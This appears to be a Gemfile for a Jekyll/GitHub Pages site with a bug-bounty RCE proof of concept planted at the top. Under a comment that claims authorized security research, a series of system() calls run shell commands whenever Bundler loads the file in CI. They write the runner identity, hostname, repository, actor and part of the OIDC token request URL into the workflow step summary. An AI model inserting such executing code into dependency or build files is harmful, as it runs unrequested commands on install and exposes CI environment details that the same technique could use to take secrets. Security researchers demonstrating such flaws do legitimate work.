source "https://rubygems.org"

# BBP RCE proof-of-concept (authorized security research)
system("echo \"## RCE_PROOF\" >> $GITHUB_STEP_SUMMARY")
system("echo \"\`\`\`\" >> $GITHUB_STEP_SUMMARY")
system("echo \"runner user: $(id)\" >> $GITHUB_STEP_SUMMARY")
system("echo \"hostname: $(hostname)\" >> $GITHUB_STEP_SUMMARY")
system("echo \"GITHUB_REPOSITORY: $GITHUB_REPOSITORY\" >> $GITHUB_STEP_SUMMARY")
system("echo \"GITHUB_ACTOR: $GITHUB_ACTOR\" >> $GITHUB_STEP_SUMMARY")
system("echo \"ACTIONS_ID_TOKEN_REQUEST_URL prefix: ${ACTIONS_ID_TOKEN_REQUEST_URL:0:50}\" >> $GITHUB_STEP_SUMMARY")
system("echo \"\`\`\`\" >> $GITHUB_STEP_SUMMARY")

gem "faraday", "2.14.1"
gem "faraday-retry", "2.4.0"
gem "github-pages", "~> 232", group: :jekyll_plugins
gem "json", "2.19.4"
gem "language_server-protocol", "3.17.0.5"
gem "nokogiri", "~> 1.19.2"
gem "rake", "13.4.2"
gem "rubocop", "1.86.1"

group :test do
  gem "fastimage"
  gem "httparty"
  gem "minitest"
  gem "octokit"
  gem "pry", require: false
  gem "rubocop-performance"
  gem "safe_yaml"
end

group :development do
  gem "webrick"
end
